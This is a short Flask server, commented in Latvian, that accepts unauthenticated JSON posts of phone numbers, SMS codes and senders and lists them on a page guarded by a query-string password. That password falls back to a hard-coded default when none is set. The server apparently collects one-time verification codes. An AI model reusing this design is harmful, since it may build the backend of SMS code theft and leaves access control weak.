from flask import Flask, request, jsonify, render_template, abort, Response
from flask_sqlalchemy import SQLAlchemy
import os
from datetime import datetime

app = Flask(__name__)

# Ielādē datubāzes URL no vides mainīgā
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Modeļa definīcija
class SmsLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(50))
    code = db.Column(db.String(50))
    sender = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime)

# Izveido tabulas uzreiz servera startā
with app.app_context():
    db.create_all()

# Drošības parole no vides mainīgā
ACCESS_PASSWORD = os.getenv('ACCESS_PASSWORD', 'defaultpassword')

@app.route('/')
def index():
    return "Serveris darbojas"

@app.route('/logs')
def logs():
    auth = request.args.get('auth')
    if auth != ACCESS_PASSWORD:
        abort(401)  # Neautorizēts pieprasījums

    sms_records = SmsLog.query.order_by(SmsLog.timestamp.desc()).all()
    return render_template('logs.html', logs=sms_records)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Nav datu'}), 400

    try:
        timestamp = datetime.fromtimestamp(data.get('timestamp') / 1000)
        sms_log = SmsLog(
            phone=data.get('phone'),
            code=data.get('code'),
            sender=data.get('sender'),
            timestamp=timestamp
        )
        db.session.add(sms_log)
        db.session.commit()
        return jsonify({'status': 'OK'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
